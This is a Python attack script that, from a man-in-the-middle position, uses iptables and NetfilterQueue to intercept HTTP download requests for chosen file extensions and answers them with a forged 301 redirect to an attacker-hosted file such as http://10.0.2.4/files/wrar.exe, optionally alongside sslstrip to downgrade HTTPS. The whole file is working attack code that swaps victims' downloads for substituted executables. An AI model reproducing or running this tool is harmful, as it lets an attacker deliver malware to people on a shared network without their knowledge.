##!/usr/bin/env python

# Python 3.8
# https://github.com/kti/python-netfilterqueue
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip install -U git+https://github.com/kti/python-netfilterqueue

# https://pythex.org/
# https://moxie.org/software/sslstrip/
# https://gitlab.com/kalilinux/packages/sslstrip

# Examples:
# python replace_downloads.py -e .tar.gz -l http://10.0.2.4/files/rarlinux.tar.gz
# python replace_downloads.py -p 10000 --sslstrip -e .exe -l http://10.0.2.4/files/wrar.exe


import argparse
import re
import subprocess

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(file_ext, load, port):

    def inner(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
        if scapy_packet.haslayer(scapy.Raw):

            path_search = re.search("(?:://)(.*?)(?:/)", load)
            path = path_search.group(1)

            if scapy_packet[scapy.TCP].dport == int(port) and path not in scapy_packet[scapy.Raw].load:
                # HTTP request
                if str(file_ext) in scapy_packet[scapy.Raw].load:
                    print("[+] File request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == int(port):
                # HTTP response
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    packet_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + load + "\n\n"
                    modified_packet = set_load(scapy_packet, packet_load)

                    packet.set_payload(str(modified_packet))

        packet.accept()

    return inner


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--ext", dest="file_ext", help="File extension to catch")
    parser.add_argument("-l", "--load", dest="load", help="Reference to file")
    parser.add_argument("-p", "--port", dest="port", help="Packet transferring port", default="80")
    parser.add_argument('--sslstrip', default=False, action='store_true')

    options = parser.parse_args()
    if not options.file_ext:
        parser.error("[-] Please specify a file extension, use --help for more info")
    elif not options.load:
        parser.error("[-] Please specify a load file, use --help for more info")
    print("File extension: " + options.file_ext)
    print("Reference to file: " + options.load)
    print("Packet transferring port: " + options.port)
    print("sslstrip mode: " + str(options.sslstrip))
    print("\n")
    return options


def flush_iptables():
    print("Flushing iptables...")
    subprocess.call("iptables --flush", shell=True)


def init_iptables():
    flush_iptables()
    # traps all packets from FORWARD chain to NFQUEUE
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")


def init_sslstrip_iptables(port):
    flush_iptables()
    subprocess.call(("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port),
                    shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")
    print("In this mode, the port should be the same as in running sslstrip")


try:
    options = get_arguments()
    port = options.port

    if options.sslstrip:
        init_sslstrip_iptables(port)
    else:
        init_iptables()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet(options.file_ext, options.load, port))
    queue.run()
except KeyboardInterrupt:
    print("\nExiting...")
except Exception as e:
    print("Something went wrong!\n\n" + str(e))
finally:
    flush_iptables()
